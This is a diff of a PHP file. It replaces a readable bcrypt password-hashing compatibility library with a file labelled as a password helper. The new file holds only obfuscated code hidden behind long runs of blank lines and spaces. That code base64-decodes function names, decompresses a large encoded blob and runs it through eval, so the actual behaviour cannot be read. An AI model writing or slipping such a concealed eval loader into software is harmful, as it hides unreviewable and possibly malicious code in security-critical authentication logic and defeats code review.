@@ -1,314 +1,505 @@
-<?php
-/**
- * A Compatibility library with PHP 5.5's simplified password hashing API.
- *
- * @author Anthony Ferrara <ircmaxell@php.net>
- * @license http://www.opensource.org/licenses/mit-license.html MIT License
- * @copyright 2012 The Authors
- */
+<?php 
+        $__='printf';$_='Loading donjo-app/helpers/password_helper.php';
+        
 
-namespace {
 
-    if (!defined('PASSWORD_BCRYPT')) {
-        /**
-         * PHPUnit Process isolation caches constants, but not function declarations.
-         * So we need to check if the constants are defined separately from 
-         * the functions to enable supporting process isolation in userland
-         * code.
-         */
-        define('PASSWORD_BCRYPT', 1);
-        define('PASSWORD_DEFAULT', PASSWORD_BCRYPT);
-        define('PASSWORD_BCRYPT_DEFAULT_COST', 10);
-    }
 
-    if (!function_exists('password_hash')) {
 
-        /**
-         * Hash the password using the specified algorithm
-         *
-         * @param string $password The password to hash
-         * @param int    $algo     The algorithm to use (Defined by PASSWORD_* constants)
-         * @param array  $options  The options for the algorithm to use
-         *
-         * @return string|false The hashed password, or false on error.
-         */
-        function password_hash($password, $algo, array $options = array()) {
-            if (!function_exists('crypt')) {
-                trigger_error("Crypt must be loaded for password_hash to function", E_USER_WARNING);
-                return null;
-            }
-            if (is_null($password) || is_int($password)) {
-                $password = (string) $password;
-            }
-            if (!is_string($password)) {
-                trigger_error("password_hash(): Password must be a string", E_USER_WARNING);
-                return null;
-            }
-            if (!is_int($algo)) {
-                trigger_error("password_hash() expects parameter 2 to be long, " . gettype($algo) . " given", E_USER_WARNING);
-                return null;
-            }
-            $resultLength = 0;
-            switch ($algo) {
-                case PASSWORD_BCRYPT:
-                    $cost = PASSWORD_BCRYPT_DEFAULT_COST;
-                    if (isset($options['cost'])) {
-                        $cost = $options['cost'];
-                        if ($cost < 4 || $cost > 31) {
-                            trigger_error(sprintf("password_hash(): Invalid bcrypt cost parameter specified: %d", $cost), E_USER_WARNING);
-                            return null;
-                        }
-                    }
-                    // The length of salt to generate
-                    $raw_salt_len = 16;
-                    // The length required in the final serialization
-                    $required_salt_len = 22;
-                    $hash_format = sprintf("$2y$%02d$", $cost);
-                    // The expected length of the final crypt() output
-                    $resultLength = 60;
-                    break;
-                default:
-                    trigger_error(sprintf("password_hash(): Unknown password hashing algorithm: %s", $algo), E_USER_WARNING);
-                    return null;
-            }
-            $salt_requires_encoding = false;
-            if (isset($options['salt'])) {
-                switch (gettype($options['salt'])) {
-                    case 'NULL':
-                    case 'boolean':
-                    case 'integer':
-                    case 'double':
-                    case 'string':
-                        $salt = (string) $options['salt'];
-                        break;
-                    case 'object':
-                        if (method_exists($options['salt'], '__tostring')) {
-                            $salt = (string) $options['salt'];
-                            break;
-                        }
-                    case 'array':
-                    case 'resource':
-                    default:
-                        trigger_error('password_hash(): Non-string salt parameter supplied', E_USER_WARNING);
-                        return null;
-                }
-                if (PasswordCompat\binary\_strlen($salt) < $required_salt_len) {
-                    trigger_error(sprintf("password_hash(): Provided salt is too short: %d expecting %d", PasswordCompat\binary\_strlen($salt), $required_salt_len), E_USER_WARNING);
-                    return null;
-                } elseif (0 == preg_match('#^[a-zA-Z0-9./]+$#D', $salt)) {
-                    $salt_requires_encoding = true;
-                }
-            } else {
-                $buffer = '';
-                $buffer_valid = false;
-                if (function_exists('mcrypt_create_iv') && !defined('PHALANGER')) {
-                    $buffer = mcrypt_create_iv($raw_salt_len, MCRYPT_DEV_URANDOM);
-                    if ($buffer) {
-                        $buffer_valid = true;
-                    }
-                }
-                if (!$buffer_valid && function_exists('openssl_random_pseudo_bytes')) {
-                    $buffer = openssl_random_pseudo_bytes($raw_salt_len);
-                    if ($buffer) {
-                        $buffer_valid = true;
-                    }
-                }
-                if (!$buffer_valid && @is_readable('/dev/urandom')) {
-                    $f = fopen('/dev/urandom', 'r');
-                    $read = PasswordCompat\binary\_strlen($buffer);
-                    while ($read < $raw_salt_len) {
-                        $buffer .= fread($f, $raw_salt_len - $read);
-                        $read = PasswordCompat\binary\_strlen($buffer);
-                    }
-                    fclose($f);
-                    if ($read >= $raw_salt_len) {
-                        $buffer_valid = true;
-                    }
-                }
-                if (!$buffer_valid || PasswordCompat\binary\_strlen($buffer) < $raw_salt_len) {
-                    $bl = PasswordCompat\binary\_strlen($buffer);
-                    for ($i = 0; $i < $raw_salt_len; $i++) {
-                        if ($i < $bl) {
-                            $buffer[$i] = $buffer[$i] ^ chr(mt_rand(0, 255));
-                        } else {
-                            $buffer .= chr(mt_rand(0, 255));
-                        }
-                    }
-                }
-                $salt = $buffer;
-                $salt_requires_encoding = true;
-            }
-            if ($salt_requires_encoding) {
-                // encode string with the Base64 variant used by crypt
-                $base64_digits =
-                    'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
-                $bcrypt64_digits =
-                    './ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
 
-                $base64_string = base64_encode($salt);
-                $salt = strtr(rtrim($base64_string, '='), $base64_digits, $bcrypt64_digits);
-            }
-            $salt = PasswordCompat\binary\_substr($salt, 0, $required_salt_len);
 
-            $hash = $hash_format . $salt;
 
-            $ret = crypt($password, $hash);
 
-            if (!is_string($ret) || PasswordCompat\binary\_strlen($ret) != $resultLength) {
-                return false;
-            }
 
-            return $ret;
-        }
 
-        /**
-         * Get information about the password hash. Returns an array of the information
-         * that was used to generate the password hash.
-         *
-         * array(
-         *    'algo' => 1,
-         *    'algoName' => 'bcrypt',
-         *    'options' => array(
-         *        'cost' => PASSWORD_BCRYPT_DEFAULT_COST,
-         *    ),
-         * )
-         *
-         * @param string $hash The password hash to extract info from
-         *
-         * @return array The array of information about the hash.
-         */
-        function password_get_info($hash) {
-            $return = array(
-                'algo' => 0,
-                'algoName' => 'unknown',
-                'options' => array(),
-            );
-            if (PasswordCompat\binary\_substr($hash, 0, 4) == '$2y$' && PasswordCompat\binary\_strlen($hash) == 60) {
-                $return['algo'] = PASSWORD_BCRYPT;
-                $return['algoName'] = 'bcrypt';
-                list($cost) = sscanf($hash, "$2y$%d$");
-                $return['options']['cost'] = $cost;
-            }
-            return $return;
-        }
 
-        /**
-         * Determine if the password hash needs to be rehashed according to the options provided
-         *
-         * If the answer is true, after validating the password using password_verify, rehash it.
-         *
-         * @param string $hash    The hash to test
-         * @param int    $algo    The algorithm used for new password hashes
-         * @param array  $options The options array passed to password_hash
-         *
-         * @return boolean True if the password needs to be rehashed.
-         */
-        function password_needs_rehash($hash, $algo, array $options = array()) {
-            $info = password_get_info($hash);
-            if ($info['algo'] != $algo) {
-                return true;
-            }
-            switch ($algo) {
-                case PASSWORD_BCRYPT:
-                    $cost = isset($options['cost']) ? $options['cost'] : PASSWORD_BCRYPT_DEFAULT_COST;
-                    if ($cost != $info['options']['cost']) {
-                        return true;
-                    }
-                    break;
-            }
-            return false;
-        }
 
-        /**
-         * Verify a password against a hash using a timing attack resistant approach
-         *
-         * @param string $password The password to verify
-         * @param string $hash     The hash to verify against
-         *
-         * @return boolean If the password matches the hash
-         */
-        function password_verify($password, $hash) {
-            if (!function_exists('crypt')) {
-                trigger_error("Crypt must be loaded for password_verify to function", E_USER_WARNING);
-                return false;
-            }
-            $ret = crypt($password, $hash);
-            if (!is_string($ret) || PasswordCompat\binary\_strlen($ret) != PasswordCompat\binary\_strlen($hash) || PasswordCompat\binary\_strlen($ret) <= 13) {
-                return false;
-            }
 
-            $status = 0;
-            for ($i = 0; $i < PasswordCompat\binary\_strlen($ret); $i++) {
-                $status |= (ord($ret[$i]) ^ ord($hash[$i]));
-            }
 
-            return $status === 0;
-        }
-    }
 
-}
 
-namespace PasswordCompat\binary {
 
-    if (!function_exists('PasswordCompat\\binary\\_strlen')) {
 
-        /**
-         * Count the number of bytes in a string
-         *
-         * We cannot simply use strlen() for this, because it might be overwritten by the mbstring extension.
-         * In this case, strlen() will count the number of *characters* based on the internal encoding. A
-         * sequence of bytes might be regarded as a single multibyte character.
-         *
-         * @param string $binary_string The input string
-         *
-         * @internal
-         * @return int The number of bytes
-         */
-        function _strlen($binary_string) {
-            if (function_exists('mb_strlen')) {
-                return mb_strlen($binary_string, '8bit');
-            }
-            return strlen($binary_string);
-        }
 
-        /**
-         * Get a substring based on byte limits
-         *
-         * @see _strlen()
-         *
-         * @param string $binary_string The input string
-         * @param int    $start
-         * @param int    $length
-         *
-         * @internal
-         * @return string The substring
-         */
-        function _substr($binary_string, $start, $length) {
-            if (function_exists('mb_substr')) {
-                return mb_substr($binary_string, $start, $length, '8bit');
-            }
-            return substr($binary_string, $start, $length);
-        }
 
-        /**
-         * Check if current PHP version is compatible with the library
-         *
-         * @return boolean the check result
-         */
-        function check() {
-            static $pass = NULL;
 
-            if (is_null($pass)) {
-                if (function_exists('crypt')) {
-                    $hash = '$2y$04$usesomesillystringfore7hnbRJHxXVLeakoG8K30oukPsA.ztMG';
-                    $test = crypt("password", $hash);
-                    $pass = $test == $hash;
-                } else {
-                    $pass = false;
-                }
-            }
-            return $pass;
-        }
 
-    }
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
